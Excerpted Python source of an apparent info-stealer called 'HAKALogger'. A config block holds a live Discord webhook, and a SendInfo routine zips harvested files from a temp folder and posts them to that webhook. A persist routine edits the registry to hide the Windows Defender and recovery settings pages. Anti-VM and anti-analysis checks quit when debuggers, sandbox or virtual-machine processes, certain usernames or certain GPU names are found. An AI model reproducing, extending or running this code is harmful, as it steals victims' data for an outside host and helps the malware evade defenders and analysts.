...
config = {
    ...
    'webhook': 'https://discord.com/api/webhooks/1364110427172245514/zoJcBfe0nXVji-8MA_aCBqUQVHGVrSf21urcAB7w2YzEJxj0z3Vnn2mA_XHhZsrnR4IP',
    'persist': False,
    'keep-alive': False,
    ...
    def gen_tree(self, path):
        ...
        for dirpath, dirnames, filenames in os.walk(path):
            ...
            for n, f in enumerate(filenames):
                if f == f'HAKALogger-{os.getlogin()}.zip': continue
...
''')
    ...
    def SendInfo(self):
        ...
        _zipfile = os.path.join(self.tempfolder, f'HAKALogger-{os.getlogin()}.zip')
        zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(self.tempfolder)
        for dirname, _, files in os.walk(self.tempfolder):
            for filename in files:
                if filename == f'HAKALogger-{os.getlogin()}.zip': continue
        ...
        embed = {
            "username": f"{os.getlogin()} | HAKALogger",
            "content": "@everyone",
    ...
    def persist(self):
        ...
        if elevated:
            try:
                self.system(r'reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "SettingsPageVisibility" /t REG_SZ /d "hide:recovery;windowsdefender" /f >nul')
    ...
    if config['antivm']:
        ...
        for process in psutil.process_iter():
            if process.name() in [
                ...
                "vboxservice.exe", "df5serv.exe", "processhacker.exe", "vboxtray.exe", "vmtoolsd.exe",
                "vmwaretray.exe", "ida64.exe", "ollydbg.exe", "pestudio.exe", "vmwareuser.exe",
                "vgauthservice.exe", "vmacthlp.exe", "vmsrvc.exe", "x32dbg.exe", "x64dbg.exe",
                "x96dbg.exe", "vmusrvc.exe", "prl_cc.exe", "prl_tools.exe", "qemu-ga.exe",
                "joeboxcontrol.exe", "ksdumperclient.exe", "xenservice.exe", "joeboxserver.exe",
                "devenv.exe", "IMMUNITYDEBUGGER.EXE", "ImportREC.exe", "reshacker.exe", "windbg.exe",
                "32dbg.exe", "64dbg.exex", "protection_id.exex", "scylla_x86.exe", "scylla_x64.exe",
                "scylla.exe", "idau64.exe", "idau.exe", "idaq64.exe", "idaq.exe", "idaw.exe",
                "idag64.exe", "idag.exe", "ida64.exe", "ida.exe"
            ]:
                return
        if os.getlogin() in [
            ...
            return
        try:
            gpu_name = functions.system(functions, r'powershell "Get-CimInstance Win32_VideoController | Select-Object -ExpandProperty Name"').splitlines()[0]
            if gpu_name in [
            ...
            print("Failed to fetch GPU name:", e)
